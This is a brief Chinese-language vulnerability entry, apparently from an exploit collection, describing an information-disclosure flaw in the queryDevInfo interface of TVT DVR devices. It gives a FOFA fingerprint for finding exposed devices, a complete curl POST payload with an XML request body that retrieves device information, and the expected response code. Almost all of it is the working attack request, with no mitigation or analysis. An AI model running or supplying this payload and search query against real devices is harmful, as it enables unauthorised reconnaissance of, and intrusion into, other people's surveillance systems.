# TVTDVR接口queryDevInfo存在信息泄漏

TVTDVR ｜ 信息泄露 ｜ —
- **指纹**：`fofa:"v\=20180615.01\" src\=\"js/lib/require.js\" type\=\"text/javascript"`

**Payload**
```
curl -X POST "http://ip/queryDevInfo" \
-H "Accept-Language: en-US,en;q=0.9" \
-H "Accept-Encoding: gzip, deflate" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "Upgrade-Insecure-Requests: 1" \
-H "Connection: keep-alive" \
-H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS like Mac OS X) AppleWebKit (KHTML, like Gecko) Version Mobile Safari" \
-H "Content-Length: 103" \
-d '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
```
- **响应特征**：200